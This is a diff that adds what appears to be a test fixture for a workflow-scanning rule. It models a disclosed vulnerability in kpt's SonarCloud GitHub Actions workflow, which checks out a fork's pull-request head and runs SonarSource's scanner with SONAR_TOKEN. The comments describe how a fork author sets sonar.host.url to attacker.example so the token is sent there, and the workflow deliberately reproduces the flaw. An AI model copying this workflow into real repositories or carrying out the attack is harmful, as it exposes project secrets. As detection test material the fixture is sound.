@@ -1,0 +1,48 @@
+# situation: the SonarCloud workflow of kptdev/kpt of GHSL-2026-208
+#   (https://securitylab.github.com/advisories/GHSL-2026-208_kptdev_kpt_repository/,
+#   https://github.com/kptdev/kpt/blob/6345d96d661eae1f6cdcb97b1f70080ce35f61a4/.github/workflows/sonarcloud.yml).
+#   On workflow_run of the workflow Go, the job checks out the head
+#   repository and the head SHA of the run that triggered workflow_run,
+#   which are the fork and the fork's commit for a pull request from a fork,
+#   and runs SonarSource's scanner with SONAR_TOKEN and the file
+#   sonar.properties of the working tree.
+# reason: the file sonar.properties of the pull request decides the host to
+#   which the scanner sends SONAR_TOKEN, and untrusted-checkout reports the
+#   checkout that brings the file.
+# cause: the rule reads the hosts written in the inputs and the commands of
+#   the workflow, not the files that an action reads.
+# attack: the author of a pull request from a fork writes
+#   sonar.host.url=https://attacker.example in sonar.properties.
+# attack-run-behavior: the scanner reads sonar.properties and sends the
+#   first request of the scanner, with the header Authorization: Bearer
+#   <the value of SONAR_TOKEN>, to https://attacker.example.
+# advisory: https://securitylab.github.com/advisories/GHSL-2026-208_kptdev_kpt_repository/
+on:
+  workflow_run:
+    workflows: [Go]
+    types: [completed]
+jobs:
+  sonarqube:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      pull-requests: read
+    steps:
+      - name: Checkout PR head
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+        with:
+          repository: ${{ github.event.workflow_run.head_repository.full_name }}
+          ref: ${{ github.event.workflow_run.head_sha }}
+          fetch-depth: 0
+          persist-credentials: false
+          allow-unsafe-pr-checkout: true
+      - name: SonarQube Scan on PR
+        uses: SonarSource/sonarqube-scan-action@713881670b6b3676cda39549040e2d88c70d582e # v8.2.0
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+        with:
+          args: >
+            -Dsonar.projectKey=kptdev_kpt
+            -Dsonar.organization=kptdev
+            -Dproject.settings=sonar.properties
